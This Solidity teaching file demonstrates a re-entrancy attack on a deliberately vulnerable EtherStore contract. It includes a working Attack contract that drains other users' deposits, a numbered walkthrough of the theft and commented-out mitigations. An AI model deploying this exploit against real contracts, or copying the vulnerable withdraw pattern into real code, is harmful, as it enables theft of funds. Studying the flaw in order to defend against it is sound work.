// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
EtherStore is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
*/

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");//This can be called multiple times from an external contracts fallback(). a way to migate this attack it to zero out the balance before this call. see commented out withdraw function
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    //BEST PRACTICE: MUTATE ANY CONTRACT STATE BEFORE CALLING AN EXTRENAL CONRTACT'S FUNCTION to migate reentrant attack

    //Re-entrant attack mitigation technique 1 
    // function withdraw() public {
    //     uint bal = balances[msg.sender];
    //     require(bal > 0);

    //     balances[msg.sender] = 0; zero out balance then make the call to send balance. if there is an attacking contract, the fallback function cant get past the require(bal > 0)

    //     (bool sent, ) = msg.sender.call{value: bal}("");
    //     require(sent, "Failed to send Ether");
    // }

    //Re-entrant attack mitigation technique 2 a.k.a mutex Openzeppelin has a modifer contract that we can implement. NonReentrant that does the same as the locked boolean in the below code SEE: nft-market-place.sol for example of openzepplin reentrant mitigation
    //bool locked;
    // function withdraw() public {
    //     require(!locked, "revert due to re-entrant attack");
    //     locked = true;
    //     uint bal = balances[msg.sender];
    //     require(bal > 0);

    //     (bool sent, ) = msg.sender.call{value: bal}("");
    //     require(sent, "Failed to send Ether");

    //     balances[msg.sender] = 0;
    //     locked = false;
    // }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}